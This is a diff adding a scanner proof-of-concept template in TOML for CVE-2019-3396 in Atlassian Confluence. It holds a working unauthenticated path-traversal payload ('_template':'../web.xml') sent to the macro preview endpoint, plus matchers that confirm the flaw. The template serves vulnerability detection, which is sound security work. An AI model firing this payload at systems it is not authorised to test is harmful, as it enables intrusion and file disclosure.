@@ -1,0 +1,39 @@
+[info]
+author = "ave"
+description = "通过向 Confluence 的 /rest/tinymce/1/macro/preview 接口发送恶意 JSON 请求，利用 Widget Connector 宏参数 _template 进行目录穿越，读取 web.xml 以验证服务端模板注入漏洞存在（CVE-2019-3396，CVSS 9.8，无需认证即可利用）。"
+id = "POC-AVE-2019-1200"
+name = "Atlassian Confluence Widget Connector 路径穿越/SSTI PoC"
+severity = "critical"
+tags = ["ave-2019-1200"]
+vuln_id = [
+    "CVE-2019-3396",
+    "AVE-2019-1200",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/rest/tinymce/1/macro/preview"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"../web.xml"}}}'
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/json; charset=utf-8"
+Referer = "{{Hostname}}"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<param-name>contextConfigLocation</param-name>"]
